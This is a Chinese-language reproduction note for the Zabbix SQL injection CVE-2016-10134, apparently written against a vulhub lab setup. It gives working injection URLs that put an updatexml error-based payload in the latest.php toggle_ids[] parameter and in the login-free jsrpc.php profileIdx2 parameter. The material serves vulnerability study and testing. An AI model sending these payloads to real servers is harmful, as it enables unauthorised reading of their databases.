（CVE-2016-10134）Zabbix latest.php sql注入漏洞
===============================================

一、漏洞简介
------------

Zabbix2.2.14之前的版本和3.0.4之前的3.0版本中存在SQL注入漏洞。远程攻击者可借助`latest.php`文件中的`toggle_ids`数组参数利用该漏洞执行任意SQL命令。

二、漏洞影响
------------

Zabbix2.2.14之前的版本和3.0.4之前的3.0版本

三、复现过程
------------

访问`http://www.0-sec.org:8080`，用账号`guest`（密码为空）登录游客账户。

登录后，查看Cookie中的`zbx_sessionid`，复制后16位字符：

![1.png](./.resource/(CVE-2016-10134)Zabbixlatest.phpsql注入漏洞/media/rId24.png)

将这16个字符作为sid的值，访问`http://www.0-sec.org:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)`，可见成功注入：

![2.png](./.resource/(CVE-2016-10134)Zabbixlatest.phpsql注入漏洞/media/rId25.png)

这个漏洞也可以通过jsrpc.php触发，且无需登录：`http://www.0-sec.org:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)`：

![3.png](./.resource/(CVE-2016-10134)Zabbixlatest.phpsql注入漏洞/media/rId26.png)

参考链接
--------

> https://vulhub.org/\#/environments/zabbix/CVE-2016-10134/
